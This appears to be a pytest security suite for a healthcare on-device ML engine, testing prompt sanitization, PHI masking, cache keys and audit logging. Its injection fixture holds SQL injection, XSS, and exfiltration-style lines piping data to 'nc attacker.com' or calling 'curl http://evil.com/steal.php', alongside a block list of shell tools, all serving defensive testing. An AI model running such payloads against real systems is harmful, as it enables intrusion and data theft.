"""
Comprehensive ML Security Tests for SOC2 Type II, HIPAA, and GDPR Compliance

Tests critical security aspects of the ML infrastructure without mocks,
ensuring enterprise-grade security for healthcare AI systems.
"""

import pytest
import asyncio
import sys
import re
from pathlib import Path
from unittest.mock import patch
import json
import hashlib
import hmac
from datetime import datetime
from typing import Dict, List, Any

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from app.modules.edge_ai.schemas import (
    GemmaConfig, 
    DeviceType, 
    ValidationStatus,
    GemmaOutput,
    ValidationResult,
    ClaimValidation
)

class TestMLSecurityCompliance:
    """Test suite for ML security compliance validation."""
    
    @pytest.fixture
    def secure_config(self):
        """Create a secure configuration for testing."""
        return GemmaConfig(
            model_path="/secure/test/model",
            device="cpu",
            device_type=DeviceType.TABLET,
            temperature=0.1,  # Low temperature for medical consistency
            max_memory_gb=2.0,
            quantization_enabled=True,
            emergency_mode_enabled=True
        )
    
    @pytest.fixture 
    def test_medical_prompts(self):
        """Test prompts for medical validation."""
        return {
            "legitimate": [
                "Patient presents with chest pain and shortness of breath",
                "Blood pressure 140/90, temperature 38.5C, pulse 102 bpm",
                "History of diabetes, currently on metformin treatment",
                "Laboratory results show elevated glucose levels"
            ],
            "injection_attempts": [
                "Patient has fever; DROP TABLE patients; --",
                "Symptoms include <script>alert('xss')</script> headache",
                "javascript:alert('injection') and dizziness",
                "SELECT * FROM medical_records WHERE patient_id = 1",
                "Patient data | nc attacker.com 8080",
                "History of diabetes curl http://evil.com/steal.php"
            ],
            "phi_containing": [
                "Patient John Smith, SSN 123-45-6789, has hypertension",
                "Contact at john.doe@email.com for follow-up",
                "Phone: 555-123-4567, DOB: 01/15/1980",
                "Medical record ID: AB123456, visit date 2024-01-15"
            ]
        }

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_schema_validation_security(self, secure_config):
        """Test that schema validation prevents malicious configurations."""
        # Test temperature validation
        with pytest.raises(ValueError, match="Temperature must be between"):
            GemmaConfig(
                model_path="/test",
                device="cpu", 
                device_type=DeviceType.TABLET,
                temperature=5.0  # Invalid temperature
            )
        
        # Test top_p validation
        with pytest.raises(ValueError, match="Top-p must be between"):
            GemmaConfig(
                model_path="/test",
                device="cpu",
                device_type=DeviceType.TABLET,
                top_p=2.0  # Invalid top_p
            )
        
        # Verify secure configuration is accepted
        assert secure_config.temperature == 0.1
        assert secure_config.quantization_enabled is True
        assert secure_config.emergency_mode_enabled is True

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_prompt_injection_prevention(self, test_medical_prompts):
        """Test that prompt injection attacks are prevented."""
        # Import with conditional handling
        try:
            from app.modules.edge_ai.gemma_engine import GemmaOnDeviceEngine
            from app.modules.edge_ai.schemas import GemmaConfig
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        config = GemmaConfig(
            model_path="/test",
            device="cpu",
            device_type=DeviceType.TABLET
        )
        
        engine = GemmaOnDeviceEngine(config)
        
        # Test legitimate medical prompts are accepted
        for prompt in test_medical_prompts["legitimate"]:
            sanitized = await engine._sanitize_medical_prompt(prompt)
            assert sanitized is not None, f"Legitimate prompt rejected: {prompt}"
            assert len(sanitized) > 0
        
        # Test injection attempts are blocked
        for malicious_prompt in test_medical_prompts["injection_attempts"]:
            sanitized = await engine._sanitize_medical_prompt(malicious_prompt)
            # Should either be None (rejected) or cleaned (no malicious content)
            if sanitized:
                # Check that dangerous patterns are removed
                dangerous_patterns = [
                    "DROP TABLE", "SELECT", "UNION", "javascript:", 
                    "<script>", "| nc", "curl", "wget"
                ]
                for pattern in dangerous_patterns:
                    assert pattern.lower() not in sanitized.lower(), \
                        f"Dangerous pattern '{pattern}' not removed from: {sanitized}"

    @pytest.mark.security
    @pytest.mark.asyncio 
    async def test_phi_protection(self, test_medical_prompts):
        """Test that PHI is properly masked and protected."""
        try:
            from app.modules.edge_ai.gemma_engine import GemmaOnDeviceEngine
            from app.modules.edge_ai.schemas import GemmaConfig
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        config = GemmaConfig(
            model_path="/test",
            device="cpu",
            device_type=DeviceType.TABLET
        )
        
        engine = GemmaOnDeviceEngine(config)
        
        # Test PHI masking
        for phi_prompt in test_medical_prompts["phi_containing"]:
            masked = await engine._mask_potential_phi(phi_prompt)
            
            # Verify PHI patterns are masked
            assert "[SSN_MASKED]" in masked or "123-45-6789" not in masked
            assert "[EMAIL_MASKED]" in masked or "@" not in masked
            assert "[PHONE_MASKED]" in masked or "555-123-4567" not in masked
            assert "[DATE_MASKED]" in masked or not re.search(r'\d{1,2}/\d{1,2}/\d{4}', masked)
            assert "[ID_MASKED]" in masked or not re.search(r'[A-Z]{2}\d{6,8}', masked)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_medical_context_validation(self):
        """Test that only legitimate medical content is processed."""
        try:
            from app.modules.edge_ai.gemma_engine import GemmaOnDeviceEngine
            from app.modules.edge_ai.schemas import GemmaConfig
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        config = GemmaConfig(
            model_path="/test", 
            device="cpu",
            device_type=DeviceType.TABLET
        )
        
        engine = GemmaOnDeviceEngine(config)
        
        # Valid medical contexts
        valid_contexts = [
            "Patient presents with symptoms of chest pain and shortness of breath",
            "Blood pressure and temperature readings show abnormal vital signs",
            "Medical history indicates previous cardiovascular disease"
        ]
        
        for context in valid_contexts:
            is_valid = await engine._validate_medical_context(context)
            assert is_valid, f"Valid medical context rejected: {context}"
        
        # Invalid/non-medical contexts
        invalid_contexts = [
            "Hello world this is a test",
            "The weather is nice today",
            "Stock prices are rising rapidly",
            "Computer programming tutorial"
        ]
        
        for context in invalid_contexts:
            is_valid = await engine._validate_medical_context(context)
            assert not is_valid, f"Invalid context accepted: {context}"

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_cache_security(self):
        """Test that caching is secure and doesn't leak PHI."""
        try:
            from app.modules.edge_ai.gemma_engine import GemmaOnDeviceEngine
            from app.modules.edge_ai.schemas import GemmaConfig
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        config = GemmaConfig(
            model_path="/test",
            device="cpu", 
            device_type=DeviceType.TABLET
        )
        
        engine = GemmaOnDeviceEngine(config)
        
        # Test secure cache key generation
        test_prompts = [
            "Patient has chest pain",
            "Patient John Smith has chest pain",  # Contains PHI
            "DROP TABLE patients"  # Malicious
        ]
        
        cache_keys = set()
        for prompt in test_prompts:
            cache_key = engine._generate_cache_key(prompt)
            
            # Verify cache key is cryptographically secure
            assert len(cache_key) > 16, "Cache key too short"
            assert "gemma_secure_" in cache_key, "Cache key not using secure prefix"
            assert cache_key not in cache_keys, "Cache key collision detected"
            
            # Verify PHI is not in cache key
            assert "John Smith" not in cache_key
            assert "DROP TABLE" not in cache_key
            
            cache_keys.add(cache_key)

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_dependency_security_validation(self):
        """Test that ML dependencies are properly validated and secured."""
        # Test conditional imports work safely
        try:
            from app.modules.edge_ai import gemma_engine
            
            # Verify security flags are set correctly
            assert hasattr(gemma_engine, '_TRANSFORMERS_AVAILABLE')
            assert hasattr(gemma_engine, '_GOOGLE_AI_AVAILABLE') 
            assert hasattr(gemma_engine, '_FHIR_AVAILABLE')
            
            # Test that missing dependencies are handled gracefully
            if not gemma_engine._TRANSFORMERS_AVAILABLE:
                pytest.skip("Transformers not available - this is expected in some environments")
            
        except ImportError:
            # This is acceptable - the system should handle missing dependencies
            pass

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_knowledge_base_security(self):
        """Test that medical knowledge base has proper security controls."""
        try:
            from app.modules.edge_ai.gemma_engine import MedicalKnowledgeBase
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        kb = MedicalKnowledgeBase()
        
        # Verify knowledge base is initialized
        assert hasattr(kb, 'snomed_concepts')
        assert hasattr(kb, 'icd_codes')
        assert hasattr(kb, 'drug_database')
        
        # Test that knowledge base contains security warnings for production
        snomed_concepts = kb.snomed_concepts
        if "_security_warning" in snomed_concepts:
            assert "Production deployment requires secure" in snomed_concepts["_security_warning"]
        
        # Verify no hard-coded production secrets
        concepts_str = str(snomed_concepts)
        secrets_patterns = [
            r'password', r'secret', r'key', r'token', 
            r'admin', r'root', r'api[_-]?key'
        ]
        
        for pattern in secrets_patterns:
            matches = re.findall(pattern, concepts_str.lower())
            assert len(matches) == 0, f"Potential secret found in knowledge base: {pattern}"

    @pytest.mark.security
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_dos_protection(self):
        """Test that the system is protected against DoS attacks."""
        try:
            from app.modules.edge_ai.gemma_engine import GemmaOnDeviceEngine
            from app.modules.edge_ai.schemas import GemmaConfig
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        config = GemmaConfig(
            model_path="/test",
            device="cpu",
            device_type=DeviceType.TABLET
        )
        
        engine = GemmaOnDeviceEngine(config)
        
        # Test extremely long input is rejected
        long_prompt = "Patient has symptoms " * 1000  # Very long prompt
        sanitized = await engine._sanitize_medical_prompt(long_prompt)
        
        # Should either reject completely or truncate to safe length
        if sanitized:
            assert len(sanitized) < 5000, "Long prompt not properly truncated"

    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_audit_logging_requirements(self):
        """Test that security events are properly logged for audit compliance."""
        import logging
        from io import StringIO
        
        # Capture log output
        log_capture = StringIO()
        handler = logging.StreamHandler(log_capture)
        logger = logging.getLogger('app.modules.edge_ai.gemma_engine')
        logger.addHandler(handler)
        logger.setLevel(logging.WARNING)
        
        try:
            from app.modules.edge_ai.gemma_engine import GemmaOnDeviceEngine
            from app.modules.edge_ai.schemas import GemmaConfig
        except ImportError as e:
            pytest.skip(f"ML dependencies not available: {e}")
        
        config = GemmaConfig(
            model_path="/test",
            device="cpu",
            device_type=DeviceType.TABLET
        )
        
        engine = GemmaOnDeviceEngine(config)
        
        # Trigger security warnings
        await engine._sanitize_medical_prompt("This is not medical content")
        
        # Verify security events are logged
        log_output = log_capture.getvalue()
        
        # Should contain security-related log messages
        security_indicators = [
            "SECURITY WARNING", "SECURITY ERROR", "security validation"
        ]
        
        found_security_logs = any(indicator in log_output for indicator in security_indicators)
        assert found_security_logs or len(log_output) == 0, \
            "Security events should be logged for audit compliance"

class TestMLComplianceIntegration:
    """Integration tests for ML compliance with healthcare standards."""
    
    @pytest.mark.integration
    @pytest.mark.security 
    @pytest.mark.asyncio
    async def test_hipaa_compliance_integration(self):
        """Test HIPAA compliance integration with ML components."""
        # This test verifies that ML components properly integrate with
        # the existing HIPAA compliance infrastructure
        
        # Verify encryption service integration
        try:
            from app.modules.security.encryption import EncryptionService
            encryption_service = EncryptionService()
            
            # Test that medical data can be encrypted
            test_medical_data = "Patient John Doe has diabetes"
            encrypted = encryption_service.encrypt_data(test_medical_data)
            decrypted = encryption_service.decrypt_data(encrypted)
            
            assert decrypted == test_medical_data
            assert encrypted != test_medical_data
            
        except ImportError:
            pytest.skip("Encryption service not available")
    
    @pytest.mark.integration
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_soc2_audit_trail_integration(self):
        """Test SOC2 audit trail integration with ML operations."""
        # Verify that ML operations create proper audit trails
        
        try:
            from app.modules.audit_logger.service import AuditLoggerService
            
            # This would typically test that ML operations are audited
            # For now, we verify the audit service is available
            audit_service = AuditLoggerService()
            assert hasattr(audit_service, 'log_event')
            
        except ImportError:
            pytest.skip("Audit service not available")

    @pytest.mark.integration
    @pytest.mark.security
    def test_fhir_compliance_validation(self):
        """Test FHIR compliance for medical data structures."""
        # Verify that ML-generated medical data conforms to FHIR standards
        
        from app.modules.edge_ai.schemas import MedicalEntityList
        
        # Create test medical entity list
        entities = MedicalEntityList(
            symptoms=["chest pain", "shortness of breath"],
            diagnoses=["acute coronary syndrome"],
            medications=["aspirin", "nitroglycerin"],
            anatomy=["heart", "chest"],
            laboratory_values=["troponin elevated"],
            procedures=["ECG", "chest X-ray"],
            confidence_score=0.85,
            extraction_method="gemma_3n_medical",
            source_text_length=150,
            entities_per_100_chars=4.2
        )
        
        # Verify structure complies with healthcare data standards
        assert entities.confidence_score >= 0.0
        assert entities.confidence_score <= 1.0
        assert entities.extraction_method == "gemma_3n_medical"
        assert len(entities.symptoms) > 0
        assert len(entities.diagnoses) > 0

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])